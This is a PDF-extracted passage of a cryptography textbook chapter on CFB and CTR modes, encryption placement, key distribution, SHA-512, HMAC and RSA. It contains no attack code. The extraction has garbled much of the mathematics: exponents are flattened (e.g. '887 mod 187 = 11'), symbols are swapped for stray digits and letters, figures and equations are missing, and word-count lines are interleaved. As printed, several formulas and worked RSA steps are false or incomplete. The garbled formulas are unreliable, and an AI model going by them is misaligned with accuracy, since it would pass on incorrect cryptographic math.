
where the prime notation denotes bit complementation. This means that if an oppo-
nent can predictably change bits in IV, the corresponding bits of the received value 
of P1 can be changed.
[Word Count: 32]

It is possible to convert any block cipher into a stream cipher by using the cipher 
feedback (CFB) mode. A stream cipher eliminates the need to pad a message to be 
an integral number of blocks. It also can operate in real time. Thus, if a character 
stream is being transmitted, each character can be encrypted and transmitted imme-
diately using a character-oriented stream cipher.
[Word Count: 65]

One desirable property of a stream cipher is that the ciphertext be of the same 
length as the plaintext. Thus, if 8-bit characters are being transmitted, each character
[Word Count: 28]

658    Chapter 20 / Symmetric Encryption and Message Confidentiality
[Word Count: 9]

should be encrypted using 8 bits. If more than 8 bits are used, transmission capacity 
is wasted.
[Word Count: 17]

Figure 20.7 depicts the CFB scheme. In the figure, it is assumed that the unit 
of transmission is s bits; a common value is s = 8. As with CBC, the units of plain-
text are chained together, so that the ciphertext of any plaintext unit is a function of 
all the preceding plaintext.
[Word Count: 54]

First, consider encryption. The input to the encryption function is a b-bit 
shift register that is initially set to some initialization vector (IV). The leftmost 
(most significant) s bits of the output of the encryption function are XORed with 
the first unit of plaintext P1 to produce the first unit of ciphertext C1, which is then 
transmitted. In addition, the contents of the shift register are shifted left by s bits 
and C1 is placed in the rightmost (least significant) s bits of the shift register. This 
process continues until all plaintext units have been encrypted.
[Word Count: 96]

For decryption, the same scheme is used, except that the received ­ciphertext 
unit is XORed with the output of the encryption function to produce the ­plaintext 
unit. Note that it is the encryption function that is used, not the decryption
[Word Count: 40]

Figure 20.7  s-bit Cipher Feedback (CFB) Mode
[Word Count: 7]

20.5 / Cipher Block Modes of Operation   659
[Word Count: 8]

­function. This is easily explained. Let Ss(X) be defined as the most significant s 
bits of X. Then
[Word Count: 18]

The same reasoning holds for subsequent steps in the process.
[Word Count: 10]

Although interest in the counter mode (CTR) has increased recently, with applica-
tions to ATM (asynchronous transfer mode) network security and IPSec (IP secu-
rity), this mode was proposed early on (e.g., [DIFF79]).
[Word Count: 33]

Figure 20.8 depicts the CTR mode. A counter equal to the plaintext block 
size is used. The only requirement stated in SP 800-38A is that the counter value 
must be different for each plaintext block that is encrypted. Typically, the counter 
is initialized to some value and then incremented by 1 for each subsequent block 
(modulo 2b, where b is the block size). For encryption, the counter is encrypted and 
then XORed with the plaintext block to produce the ciphertext block; there is no
[Word Count: 84]

660    Chapter 20 / Symmetric Encryption and Message Confidentiality
[Word Count: 9]

chaining. For decryption, the same sequence of counter values is used, with each 
encrypted counter XORed with a ciphertext block to recover the corresponding 
plaintext block.
[Word Count: 26]

[LIPM00] lists the following advantages of CTR mode:
[Word Count: 8]

• Hardware efficiency: Unlike the three chaining modes, encryption (or
[Word Count: 10]

­decryption) in CTR mode can be done in parallel on multiple blocks of plain-
text or ciphertext. For the chaining modes, the algorithm must complete 
the computation on one block before beginning on the next block. This limits 
the ­maximum throughput of the algorithm to the reciprocal of the time for 
one execution of block encryption or decryption. In CTR mode, the through-
put is only limited by the amount of parallelism that is achieved.
 
• Software efficiency: Similarly, because of the opportunities for parallel execu-
[Word Count: 86]

tion in CTR mode, processors that support parallel features, such as aggres-
sive pipelining, multiple instruction dispatch per clock cycle, a large number of 
registers, and SIMD instructions, can be effectively utilized.
 
• Preprocessing: The execution of the underlying encryption algorithm does
[Word Count: 42]

not depend on input of the plaintext or ciphertext. Therefore, if sufficient 
memory is available and security is maintained, preprocessing can be used to 
prepare the output of the encryption boxes that feed into the XOR ­functions 
in Figure 20.8. When the plaintext or ciphertext input is presented, then 
the only computation is a series of XORs. Such a strategy greatly enhances 
throughput.
 
• Random access: The ith block of plaintext or ciphertext can be processed in
[Word Count: 77]

random access fashion. With the chaining modes, block Ci cannot be com-
puted until the i - 1 prior block are computed. There may be applications in 
which a ciphertext is stored and it is desired to decrypt just one block; for such 
applications, the random access feature is attractive.
 
• Provable security: It can be shown that CTR is at least as secure as the other
[Word Count: 67]

modes discussed in this section.
 
• Simplicity: Unlike ECB and CBC modes, CTR mode requires only the
[Word Count: 17]

­implementation of the encryption algorithm and not the decryption algorithm. 
This matters most when the decryption algorithm differs substantially from 
the encryption algorithm, as it does for AES. In addition, the decryption key 
scheduling need not be implemented.
[Word Count: 38]

20.6	Location of Symmetric Encryption Devices
[Word Count: 6]

The most powerful, and most common, approach to countering the threats 
to ­network security is encryption. In using encryption, we need to decide what 
to encrypt and where the encryption gear should be located. There are two 
­fundamental alternatives: link encryption and end-to-end encryption; these are 
illustrated in use over a frame network in Figure 20.9.
[Word Count: 56]

With link encryption, each vulnerable communications link is equipped on 
both ends with an encryption device. Thus, all traffic over all communications links
[Word Count: 23]

20.6 / Location of Symmetric Encryption Devices   661
[Word Count: 8]

is secured. Although this requires a lot of encryption devices in a large network, it 
provides a high level of security. One disadvantage of this approach is that the mes-
sage must be decrypted each time it enters a frame switch; this is necessary because 
the switch must read the address (connection identifier) in the frame header to 
route the frame. Thus, the message is vulnerable at each switch. If this is a public 
frame-relay network, the user has no control over the security of the nodes.
[Word Count: 87]

With end-to-end encryption, the encryption process is carried out at the two 
end systems. The source host or terminal encrypts the data. The data, in encrypted 
form, are then transmitted unaltered across the network to the destination terminal 
or host. The destination shares a key with the source and so is able to decrypt the 
data. This approach would seem to secure the transmission against attacks on the 
network links or switches. There is, however, still a weak spot.
[Word Count: 79]

Figure 20.9  Encryption Across a Frame Relay Network
[Word Count: 8]

662    Chapter 20 / Symmetric Encryption and Message Confidentiality
[Word Count: 9]

Thus, with end-to-end encryption, the user data are secure. However, the traf-
fic pattern is not, because frame headers are transmitted in the clear. To achieve 
greater security, both link and end-to-end encryption are needed, as shown in 
Figure 20.9.
[Word Count: 40]

To summarize, when both forms are employed, the host encrypts the user data 
portion of a frame using an end-to-end encryption key. The entire frame is then 
encrypted using a link encryption key. As the frame traverses the network, each 
switch decrypts the frame using a link encryption key to read the header and then 
encrypts the entire frame again for sending it out on the next link. Now the entire 
frame is secure except for the time that the frame is actually in the memory of a 
frame switch, at which time the frame header is in the clear.
[Word Count: 100]

1.	 A key could be selected by A and physically delivered to B.
	
2.	 A third party could select the key and physically deliver it to A and B.
	
3.	 If A and B have previously and recently used a key, one party could transmit
[Word Count: 45]

the new key to the other, encrypted using the old key.
	
4.	 If A and B each have an encrypted connection to a third party C, C could
[Word Count: 28]

deliver a key on the encrypted links to A and B.
[Word Count: 11]

Options 1 and 2 call for manual delivery of a key. For link encryption, this is 
a reasonable requirement, because each link encryption device is only going to be 
exchanging data with its partner on the other end of the link. However, for end-to-
end encryption, manual delivery is awkward. In a distributed system, any given host 
or terminal may need to engage in exchanges with many other hosts and terminals 
over time. Thus, each device needs a number of keys, supplied dynamically. The 
problem is especially difficult in a wide area distributed system.
[Word Count: 94]

Option 3 is a possibility for either link encryption or end-to-end encryption, but 
if an attacker ever succeeds in gaining access to one key, then all subsequent keys are 
revealed. Even if frequent changes are made to the link encryption keys, these should 
be done manually. To provide keys for end-to-end encryption, option 4 is preferable.
[Word Count: 56]

Figure 20.10 illustrates an implementation that satisfies option 4 for end-to-
end encryption. In the figure, link encryption is ignored. This can be added, or not, 
as required. For this scheme, two kinds of keys are identified:
[Word Count: 37]

• Session key: When two end systems (hosts, terminals, etc.) wish to communi-
[Word Count: 13]

cate, they establish a logical connection (e.g., virtual circuit). For the duration
[Word Count: 12]

of that logical connection, all user data are encrypted with a one-time ses-
sion key. At the conclusion of the session, or connection, the session key is 
­destroyed.
 
• Permanent key: A permanent key is a key used between entities for the pur-
[Word Count: 43]

The configuration consists of the following elements:
[Word Count: 7]

• Key distribution center: The key distribution center (KDC) determines
[Word Count: 10]

which systems are allowed to communicate with each other. When permission 
is granted for two systems to establish a connection, the KDC provides a  
one-time session key for that connection.
 
• Security service module (SSM): This module, which may consist of functional-
[Word Count: 42]

ity at one protocol layer, performs end-to-end encryption and obtains session 
keys on behalf of users.
[Word Count: 16]

1. Host sends packet requesting connection.
2. Security service buffers packet; asks
    KDC for session key.
3. KDC distributes session key to both hosts.
4. Buffered packet transmitted.
[Word Count: 28]

Figure 20.10  Automatic Key Distribution for Connection-Oriented Protocd
[Word Count: 8]

664    Chapter 20 / Symmetric Encryption and Message Confidentiality
[Word Count: 9]

STAL14a	
Stallings, W. Cryptography and Network Security: Principles and Practice, Sixth 
Edition. Upper Saddle River, NJ: Prentice Hall, 2014.
[Word Count: 19]

20.9 Key Terms, Review Questions, and Problems
[Word Count: 7]

Standard (AES)
block cipher
brute-force attack
computationally secure
cipher block chaining
[Word Count: 11]

Encryption  
Standard (DES)
decryption
electronic codebook
[Word Count: 6]

(ECB) mode
encryption
end-to-end encryption
Feistel cipher
key distribution
[Word Count: 9]

keystream
link encryption
modes of operation
plaintext
RC4
session key
stream cipher
subkey
symmetric encryption
triple DES (3DES)
[Word Count: 18]

The automated key distribution approach provides the flexibility and dynamic 
characteristics needed to allow a number of terminal users to access a number of 
hosts and for the hosts to exchange data with each other.
[Word Count: 35]

Another approach to key distribution uses public-key encryption, which is 
­discussed in Chapter 21.
[Word Count: 14]

The topics in this chapter are covered in greater detail in [STAL14a].
[Word Count: 12]

20.9 / Key Terms, Review Questions, and Problems   665
[Word Count: 9]

20.1	
Show that Feistel decryption is the inverse of Feistel encryption.
	 20.2	
Consider a Feistel cipher composed of 16 rounds with block length 128 bits and key 
length 128 bits. Suppose that, for a given k, the key scheduling algorithm determines 
values for the first 8 round keys, k1, k2, . . . k8, and then sets
[Word Count: 57]

k9 = k8, k10 = k7, k11 = k6, . . . , k16 = k1
[Word Count: 16]

EL(k, [m1 ⊕m2]) = EL (k, m1) ⊕EL (k, m1) for all 128-bit patterns m1, m2
[Word Count: 16]

666    Chapter 20 / Symmetric Encryption and Message Confidentiality
[Word Count: 9]

Figure 20.11  Use of Triple DES in CBC Mode
[Word Count: 9]

ECB
Cj = E(K, Pj)    j = 1, . . . , N
Pj = D(K, Cj)    j = 1, . . . , N
[Word Count: 25]

CBC
C1 = E(K, [P1 ⊕IV])
Cj = E(K, [Pj ⊕Cj-1])    j = 2, . . . , N
[Word Count: 19]

P1 = D(K, C1) ⊕IV
Pj = D(K, Cj) ⊕Cj-1    j = 2, . . . , N
[Word Count: 18]

20.10	
Fill in the remainder of this table:
[Word Count: 8]

20.11	
CBC-Pad is a block cipher mode of operation used in the RC5 block cipher, but it 
could be used in any block cipher. CBC-Pad handles plaintext of any length. The 
­ciphertext is longer then the plaintext by at most the size of a single block. Padding is 
used to assure that the plaintext input is a multiple of the block length. It is assumed 
that the original plaintext is an integer number of bytes. This plaintext is padded at 
the end by from 1 to bb bytes, where bb equals the block size in bytes. The pad bytes
[Word Count: 99]

20.9 / Key Terms, Review Questions, and Problems   667
[Word Count: 9]

Figure 20.12  Block Cipher Modes for Plaintext Not a Multiple of Block Size
[Word Count: 13]

668    Chapter 20 / Symmetric Encryption and Message Confidentiality
[Word Count: 9]

21.1	 Secure Hash Functions
Simple Hash Functions
The SHA Secure Hash Function
SHA-3
[Word Count: 13]

21.2	 HMAC
HMAC Design Objectives
HMAC Algorithm
Security of HMAC
[Word Count: 10]

21.3	 The RSA Public-Key Encryption Algorithm
Description of the Algorithm
The Security of RSA
[Word Count: 14]

21.4	 Diffie-Hellman and Other Asymmetric Algorithms
Diffie-Hellman Key Exchange
Other Public-Key Cryptography Algorithms
[Word Count: 13]

21.6	 Key Terms, Review Questions, and Problems
[Word Count: 7]

Public-Key Cryptography  
and Message Authentication
[Word Count: 5]

670    Chapter 21 / Public-Key Cryptography and Message Authentication
[Word Count: 9]

After studying this chapter, you should be able to:
[Word Count: 9]

◆	Understand the operation of SHA-1 and SHA-2.
◆	Present an overview of the use of HMAC for message authentication.
◆	Describe the RSA algorithm.
◆	Describe the Diffie-Hellman algorithm.
[Word Count: 30]

This chapter provides technical detail on the topics introduced in Sections 2.2 
through 2.4.
[Word Count: 14]

The one-way hash function, or secure hash function, is important not only in 
­message authentication but also in digital signatures. The requirements for and 
­security of secure hash functions are discussed in Section 2.2. Here, we look at 
several hash functions, concentrating on perhaps the most widely used family of 
hash functions: Secure Hash Algorithm (SHA).
[Word Count: 56]

All hash functions operate using the following general principles. The input 
­(message, file, etc.) is viewed as a sequence of n-bit blocks. The input is processed 
one block at a time in an iterative fashion to produce an n-bit hash function.
[Word Count: 41]

One of the simplest hash functions is the bit-by-bit exclusive-OR (XOR) of 
every block. This can be expressed as follows:
[Word Count: 20]

Ci = ith bit of the hash code, 1 … i … n
m = number of n-bit blocks in the input
bij = ith bit in jth block
⊕= XOR operation
[Word Count: 32]

A simple way to improve matters is to perform a 1-bit circular shift, or ­rotation, 
on the hash value after each block is processed. The procedure can be summarized 
as follows:
[Word Count: 31]

1.	 Initially set the n-bit hash value to zero.
	
2.	 Process each successive n-bit block of data as follows:
[Word Count: 19]

a.	 Rotate the current hash value to the left by 1 bit.
b.	 XOR the block into the hash value.
[Word Count: 20]

This has the effect of “randomizing” the input more completely and overcoming any 
regularities that appear in the input.
[Word Count: 19]

Although the second procedure provides a good measure of data integrity, 
it is virtually useless for data security when an encrypted hash code is used with a 
plaintext message, as in Figures 2.6a and b. Given a message, it is an easy matter 
to produce a new message that yields that hash code: Simply prepare the desired 
alternate message and then append an n-bit block that forces the new message plus 
block to yield the desired hash code.
[Word Count: 78]

Next, encrypt the entire message plus hash code, using CBC mode to produce 
the encrypted message Y1, Y2, c , XN+1. [JUEN85] points out several ways in which 
the ciphertext of this message can be manipulated in such a way that it is not detect-
able by the hash code. For example, by the definition of CBC (Figure 20.6), we have:
[Word Count: 61]

Xi = Yi-1 ⊕D(K,Yi)
 XN+1 = YN ⊕D(K, YN+1)
[Word Count: 9]

Figure 21.1  Simple Hash Function Using Bitwise XOR
[Word Count: 8]

672    Chapter 21 / Public-Key Cryptography and Message Authentication
[Word Count: 9]

= [IV ⊕D(K, Y1)] ⊕[Y1 ⊕D(K, Y2)] ⊕c ⊕[YN-1 ⊕D(K, YN)]
[Word Count: 11]

Because the terms in the preceding equation can be XORed in any order, it follows 
that the hash code would not change if the ciphertext blocks were permuted.
[Word Count: 28]

The Secure Hash Algorithm (SHA) was developed by the National Institute of 
Standards and Technology (NIST) and published as a federal information process-
ing standard (FIPS 180) in 1993; a revised version was issued as FIPS 180-1 in 1995 
and is generally referred to as SHA-1. SHA-1 is also specified in RFC 3174, which 
essentially duplicates the material in FIPS 180-1 but adds a C code implementation.
[Word Count: 67]

In this section, we provide a description of SHA-512. The other versions are 
quite similar. The algorithm takes as input a message with a maximum length of 
less than 2128 bits and produces as output a 512-bit message digest. The input is 
­processed in 1024-bit blocks. Figure 21.2 depicts the overall processing of a message 
to produce a digest. The processing consists of the following steps:
[Word Count: 66]

• Step 1: Append padding bits. The message is padded so that its length is
[Word Count: 15]

­congruent to 896 modulo 1024 [length K 896 (mod 1024)]. Padding is always
[Word Count: 13]

Table 21.1  Comparison of SHA Parameters
[Word Count: 6]

Notes: 1. All sizes are measured in bits.
	
2. Security refers to the fact that a birthday attack on a message digest of size n produces a col-
[Word Count: 28]

lision with a work factor of approximately 2n/2.
[Word Count: 8]

added, even if the message is already of the desired length. Thus, the number 
of padding bits is in the range of 1 to 1024. The padding consists of a single 
1-bit followed by the necessary number of 0-bits.
 
• Step 2: Append length. A block of 128 bits is appended to the message. This
[Word Count: 55]

block is treated as an unsigned 128-bit integer (most significant byte first) and 
contains the length of the original message (before the padding).
[Word Count: 23]

The outcome of the first two steps yields a message that is an ­integer 
multiple of 1024 bits in length. In Figure 21.2, the expanded message is 
­represented as the sequence of 1024-bit blocks M1, M2, . . . , MN, so that the 
total length of the expanded message is N * 1024 bits.
 
• Step 3: Initialize hash buffer. A 512-bit buffer is used to hold intermediate and
[Word Count: 70]

final results of the hash function. The buffer can be represented as eight 64-bit 
registers (a, b, c, d, e, f, g, h). These registers are initialized to the following 
64-bit integers (hexadecimal values):
[Word Count: 34]

a = 6A09E667F3BCC908	
e = 510E527FADE682D1
b = BB67AE8584CAA73B	
f = 9B05688C2B3E6C1F
c = 3C6EF372FE94F82B	
g = 1F83D9ABFB41BD6B
d = A54FF53A5F1D36F1	
h = 5BE0CD19137E2179
[Word Count: 24]

These values are stored in big-endian format, which is the most ­significant 
byte of a word in the low-address (leftmost) byte position. These words were 
obtained by taking the first 64 bits of the fractional parts of the square roots of 
the first eight prime numbers.
[Word Count: 46]

Figure 21.2  Message Digest Generation Using SHA-512
[Word Count: 7]

674    Chapter 21 / Public-Key Cryptography and Message Authentication
[Word Count: 9]

• Step 4: Process message in 1024-bit (128-word) blocks. The heart of the
[Word Count: 13]

­algorithm is a module that consists of 80 rounds; this module is labeled F in 
Figure 21.2. The logic is illustrated in Figure 21.3.
[Word Count: 24]

The output of the eightieth round is added to the input to the first round 
(Hi-1) to produce Hi. The addition is done independently for each of the 
eight words in the buffer, with each of the corresponding words in Hi-1, using 
­addition modulo 264.
[Word Count: 45]

Figure 21.3  SHA-512 Processing of a Single 1024-Bit Block
[Word Count: 9]

• Step 5: Output. After all N 1024-bit blocks have been processed, the output
[Word Count: 14]

from the Nth stage is the 512-bit message digest.
[Word Count: 9]

SHA-2, particularly the 512-bit version, would appear to provide unassailable secu-
rity. However, SHA-2 shares the same structure and mathematical operations as its 
predecessors, and this is a cause for concern. Because it would take years to find a 
suitable replacement for SHA-2, should it become vulnerable, NIST announced in 
2007 a competition to produce the next generation NIST hash function, to be called 
SHA-3. The basic requirements that must be satisfied by any candidate for SHA-3 
are the following:
[Word Count: 80]

1.	 It must be possible to replace SHA-2 with SHA-3 in any application by a sim-
[Word Count: 16]

ple drop-in substitution. Therefore, SHA-3 must support hash value lengths of 
224, 256, 384, and 512 bits.
	
2.	 SHA-3 must preserve the online nature of SHA-2. That is, the algorithm must
[Word Count: 31]

process comparatively small blocks (512 or 1024 bits) at a time instead of 
requiring that the entire message be buffered in memory before processing it.
[Word Count: 25]

In this section, we look at the hash code approach to message authentication. 
Appendix E looks at message authentication based on block ciphers. In recent years, 
there has been increased interest in developing a MAC derived from a ­cryptographic 
hash code, such as SHA-1. The motivations for this interest are as follows:
[Word Count: 52]

• Cryptographic hash functions generally execute faster in software than
[Word Count: 10]

­conventional encryption algorithms such as DES.
 
• Library code for cryptographic hash functions is widely available.
[Word Count: 16]

A hash function such as SHA-1 was not designed for use as a MAC and 
­cannot be used directly for that purpose because it does not rely on a secret key. 
There have been a number of proposals for the incorporation of a secret key 
into an ­existing hash algorithm. The approach that has received the most support 
is HMAC [BELL96]. HMAC has been issued as RFC 2104, has been chosen as 
the ­mandatory-to-implement MAC for IP Security, and is used in other Internet
[Word Count: 84]

676    Chapter 21 / Public-Key Cryptography and Message Authentication
[Word Count: 9]

­protocols, such as Transport Layer Security (TLS, soon to replace Secure Sockets 
Layer) and Secure Electronic Transaction (SET).
[Word Count: 18]

RFC 2104 lists the following design objectives for HMAC:
[Word Count: 9]

• To use, without modifications, available hash functions—in particular, hash
[Word Count: 10]

functions that perform well in software, and for which code is freely and 
widely available.
 
• To allow for easy replaceability of the embedded hash function in case faster
[Word Count: 29]

or more secure hash functions are found or required.
 
• To preserve the original performance of the hash function without incurring a
[Word Count: 22]

significant degradation.
 
• To use and handle keys in a simple way.
 
• To have a well-understood cryptographic analysis of the strength of the
[Word Count: 24]

­authentication mechanism based on reasonable assumptions on the embedded 
hash function.
[Word Count: 11]

The last design objective in the preceding list is, in fact, the main advantage of 
HMAC over other proposed hash-based schemes. HMAC can be proven secure pro-
vided that the embedded hash function has some reasonable cryptographic strengths. 
We return to this point later in this section, but first we examine the ­structure of HMAC.
[Word Count: 55]

Figure 21.4 illustrates the overall operation of HMAC. Define the following terms:
[Word Count: 12]

M	
= message input to HMAC (including the padding specified in the
[Word Count: 12]

embedded hash function)
Yi	
= ith block of M, 0 … i … (L - 1)
L	
= number of blocks in M
b	
= number of bits in a block
n	
= length of hash code produced by embedded hash function
K	
= secret key; if key length is greater than b, the key is input to the hash
[Word Count: 60]

­function to produce an n-bit key; recommended length is Ú n
[Word Count: 11]

K+   	 = K padded with zeros on the left so that the result is b bits in length
ipad	 = 00110110 (36 in hexadecimal) repeated b/8 times
opad = 01011100 (5C in hexadecimal) repeated b/8 times
[Word Count: 36]

HMAC(K, M) = H[(K+ ⊕opad) }H[K+ ⊕ipad] }M]]
[Word Count: 8]

1.	 Append zeros to the left end of K to create a b-bit string K+ (e.g., if K is of
[Word Count: 20]

length 160 bits and b = 512, then K will be appended with 44 zero bytes 0x00).
	
2.	 XOR (bitwise exclusive-OR) K+ with ipad to produce the b-bit block Si.
	
3.	 Append M to Si.
	
4.	 Apply H to the stream generated in step 3.
	
5.	 XOR K+ with opad to produce the b-bit block So.
	
6.	 Append the hash result from step 4 to So.
	
7.	 Apply H to the stream generated in step 6 and output the result.
[Word Count: 80]

678    Chapter 21 / Public-Key Cryptography and Message Authentication
[Word Count: 9]

Note that the XOR with ipad results in flipping one-half of the bits of K. 
Similarly, the XOR with opad results in flipping one-half of the bits of K, but a 
­different set of bits. In effect, by passing Si and So through the hash algorithm, we 
have pseudorandomly generated two keys from K.
[Word Count: 54]

HMAC should execute in approximately the same time as the embedded hash 
function for long messages. HMAC adds three executions of the basic hash function 
(for Si, So, and the block produced from the inner hash).
[Word Count: 36]

The security of any MAC function based on an embedded hash function depends 
in some way on the cryptographic strength of the underlying hash function. The 
appeal of HMAC is that its designers have been able to prove an exact rela­tionship 
between the strength of the embedded hash function and the strength of HMAC.
[Word Count: 54]

The security of a MAC function is generally expressed in terms of the proba-
bility of successful forgery with a given amount of time spent by the forger and a 
given number of message-MAC pairs created with the same key. In essence, it is 
proved in [BELL96] that for a given level of effort (time, message-MAC pairs) on 
messages generated by a legitimate user and seen by the attacker, the probability 
of successful attack on HMAC is equivalent to one of the following attacks on the 
embedded hash function:
[Word Count: 89]

1.	 The attacker is able to compute an output of the compression function even
[Word Count: 14]

with an IV that is random, secret, and unknown to the attacker.
	
2.	 The attacker finds collisions in the hash function even when the IV is random
[Word Count: 27]

In the first attack, we can view the compression function as equivalent to the 
hash function applied to a message consisting of a single b-bit block. For this attack, 
the IV of the hash function is replaced by a secret, random value of n bits. An attack 
on this hash function requires either a brute-force attack on the key, which is a level 
of effort on the order of 2n, or a birthday attack, which is a special case of the ­second 
attack, discussed next.
[Word Count: 85]

21.3 / The RSA Public-Key Encryption Algorithm   679
[Word Count: 8]

key. On a 1-Gbps link, one would need to observe a continuous stream of messages 
with no change in key for about 150,000 years in order to succeed. Thus, if speed is 
a concern, it is fully acceptable to use MD5 rather than SHA as the embedded hash 
function for HMAC.
[Word Count: 51]

21.3	The RSA Public-Key Encryption Algorithm
[Word Count: 6]

Perhaps the most widely used public-key algorithms are RSA and Diffie-Hellman. 
We examine RSA plus some security considerations in this section.1 Diffie-Hellman 
is covered in Section 21.4.
[Word Count: 27]

One of the first public-key schemes was developed in 1977 by Ron Rivest, Adi 
Shamir, and Len Adleman at MIT and first published in 1978 [RIVE78]. The 
RSA scheme has since that time reigned supreme as the most widely accepted and 
implemented approach to public-key encryption. RSA is a block cipher in which the 
plaintext and ciphertext are integers between 0 and n - 1 for some n.
[Word Count: 68]

Encryption and decryption are of the following form, for some plaintext block 
M and ciphertext block C:
[Word Count: 17]

C = Me   mod  n
 M = Cd   mod n = (Me)d mod  n = Med  mod  n
[Word Count: 18]

Both sender and receiver must know the values of n and e, and only the receiver 
knows the value of d. This is a public-key encryption algorithm with a ­public key of 
PU = {e, n} and a private key of PR = {d, n}. For this algorithm to be satisfactory 
for public-key encryption, the following requirements must be met:
[Word Count: 60]

1.	 It is possible to find values of e, d, n such that Med mod n = M for all M 6 n.
	
2.	 It is relatively easy to calculate Me and Cd for all values of M 6 n.
	
3.	 It is infeasible to determine d given e and n.
[Word Count: 51]

The first two requirements are easily met. The third requirement can be met 
for large values of e and n.
[Word Count: 20]

More should be said about the first requirement. We need to find a relation-
ship of the form
[Word Count: 18]

The preceding relationship holds if e and d are multiplicative inverses modulo f(n), 
where f(n) is the Euler totient function. It is shown in Appendix B that for p, q 
prime, f(pq) = (p - 1)(q - 1). f(n), referred to as the Euler totient of n, is the 
number of positive integers less than n and relatively prime to n. The relationship 
between e and d can be expressed as
[Word Count: 71]

1This section uses some elementary concepts from number theory. For a review, see Appendix B.
[Word Count: 15]

680    Chapter 21 / Public-Key Cryptography and Message Authentication
[Word Count: 9]

That is, e and d are multiplicative inverses mod f(n). According to the rules of 
­modular arithmetic, this is true only if d (and therefore e) is relatively prime to 
f(n). Equivalently, gcd(f(n),d) = 1; that is, the greatest common divisor of f(n) 
and d is 1.
[Word Count: 47]

Figure 21.5 summarizes the RSA algorithm. Begin by selecting two prime 
numbers, p and q, and calculating their product n, which is the modulus for encryp-
tion and decryption. Next, we need the quantity f(n). Then select an integer e that 
is relatively prime to f(n) [i.e., the greatest common divisor of e and f(n) is 1]. 
Finally, calculate d as the multiplicative inverse of e, modulo f(n). It can be shown 
that d and e have the desired properties.
[Word Count: 80]

Suppose that user A has published its public key and that user B wishes to 
send the message M to A. Then B calculates C = Me (mod n) and transmits C. On 
receipt of this ciphertext, user A decrypts by calculating M = Cd (mod n).
[Word Count: 47]

An example, from [SING99], is shown in Figure 21.6. For this example, the 
keys were generated as follows:
[Word Count: 18]

1.	 Select two prime numbers, p = 17 and q = 11.
	
2.	 Calculate n = pq = 17 * 11 = 187.
[Word Count: 23]

3.	 Calculate f(n) = (p - 1)(q - 1) = 16 * 10 = 160.
[Word Count: 15]

Select integer e 
gcd(h(n), e) = 1; 1 6 e 6 h(n)
[Word Count: 12]

21.3 / The RSA Public-Key Encryption Algorithm   681
[Word Count: 8]

4.	 Select e such that e is relatively prime to f(n) = 160 and less than f(n); we
[Word Count: 18]

choose e = 7.
	
5.	 Determine d such that de mod 160 = 1 and d 6 160. The correct value is
[Word Count: 22]

d = 23, because 23 * 7 = 161 = (1 * 160) + 1.
[Word Count: 15]

The resulting keys are public key PU = {7, 187} and private key PR = {23, 187}. 
The example shows the use of these keys for a plaintext input of M = 88. For 
encryption, we need to calculate C = 887 mod 187. Exploiting the properties of 
modular arithmetic, we can do this as follows:
[Word Count: 56]

8 87 mod 187 = [(884 mod 187) * (882 mod 187) * (881 mod 187)] mod 187
	
 881 mod 187 = 88
	
 882 mod 187 = 7744 mod 187 = 77
	
 884 mod 187 = 59,969,536 mod 187 = 132
	
 887 mod 187 = (88 * 77 * 132) mod 187 = 894,432 mod 187 = 11
[Word Count: 58]

For decryption, we calculate M = 1123 mod 187:
 1123 mod 187 = [(111 mod 187) * (112 mod 187) * (114 mod 187) *
[Word Count: 25]

(118 mod 187) * (118 mod 187)] mod 187
 111 mod 187 = 11
[Word Count: 14]

112 mod 187 = 121
 114 mod 187 = 14,641 mod 187 = 55
 118 mod 187 = 214,358,881 mod 187 = 33
 1123 mod 187 = (11 * 121 * 55 * 33 * 33) mod 187 = 79, 720, 245
[Word Count: 42]

Four possible approaches to attacking the RSA algorithm are as follows:
[Word Count: 11]

• Brute force: This involves trying all possible private keys.
 
• Mathematical attacks: There are several approaches, all equivalent in effort to
[Word Count: 22]

factoring the product of two primes.
 
• Timing attacks: These depend on the running time of the decryption algorithm.
[Word Count: 19]

682    Chapter 21 / Public-Key Cryptography and Message Authentication
[Word Count: 9]

• Chosen ciphertext attacks: This type of attack exploits properties of the RSA
[Word Count: 13]

algorithm. A discussion of this attack is beyond the scope of this book.
[Word Count: 13]

The defense against the brute force approach is the same for RSA as for 
other cryptosystems; namely, use a large key space. Thus, the larger the number 
of bits in d, the ­better. However, because the calculations involved, both in key 
­generation and in encryption/decryption, are complex, the larger the size of the key, 
the slower the system will run.
[Word Count: 60]

In this subsection, we provide an overview of mathematical and timing attacks.
[Word Count: 12]

The Factoring Problem  We can identify three approaches to attacking RSA 
mathematically:
[Word Count: 12]

• Factor n into its two prime factors. This enables calculation of f(n) =
[Word Count: 14]

(p - 1) * (q - 1), which, in turn, enables determination of d K e -1
[Word Count: 17]

(mod f(n)).
 
• Determine f(n) directly, without first determining p and q. Again, this ­enables
[Word Count: 15]

determination of d K e -1(mod f(n)).
 
• Determine d directly, without first determining f(n).
[Word Count: 15]

Most discussions of the cryptanalysis of RSA have focused on the task of 
­factoring n into its two prime factors. Determining f(n) given n is equivalent to 
­factoring n [RIBE96]. With presently known algorithms, determining d given e and n 
appears to be at least as time consuming as the factoring problem. Hence, we can use 
factoring performance as a benchmark against which to evaluate the security of RSA.
[Word Count: 69]

21.3 / The RSA Public-Key Encryption Algorithm   683
[Word Count: 8]

A striking fact about Table 21.2 concerns the method used. Until the 
­mid-1990s, factoring attacks were made using an approach known as the quadratic 
sieve. The attack on RSA-130 used a newer algorithm, the generalized number field 
sieve (GNFS), and was able to factor a larger number than RSA-129 at only 20% of 
the computing effort.
[Word Count: 56]

In addition to specifying the size of n, a number of other constraints have been 
suggested by researchers. To avoid values of n that may be factored more easily, the 
algorithm’s inventors suggest the following constraints on p and q:
[Word Count: 40]

1.	 p and q should differ in length by only a few digits. Thus, for a 1024-bit key
[Word Count: 18]

(309 decimal digits), both p and q should be on the order of magnitude of 
1075 to 10100.
	
2.	 Both (p - 1) and (q - 1) should contain a large prime factor.
	
3.	 gcd(p - 1, q - 1) should be small.
[Word Count: 43]

In addition, it has been demonstrated that if e 6 n and d 6 n1/4, then d can be ­easily 
determined [WIEN90].
[Word Count: 22]

Timing Attacks  If one needed yet another lesson about how difficult it is to 
assess the security of a cryptographic algorithm, the appearance of timing attacks 
provides a stunning one. Paul Kocher, a cryptographic consultant, demonstrated 
that a snooper can determine a private key by keeping track of how long a 
computer takes to decipher messages [KOCH96]. Timing attacks are applicable 
not just to RSA, but also to other public-key cryptography systems. This attack is 
alarming for two reasons: It comes from a completely unexpected direction and it 
is a ciphertext-only attack.
[Word Count: 92]

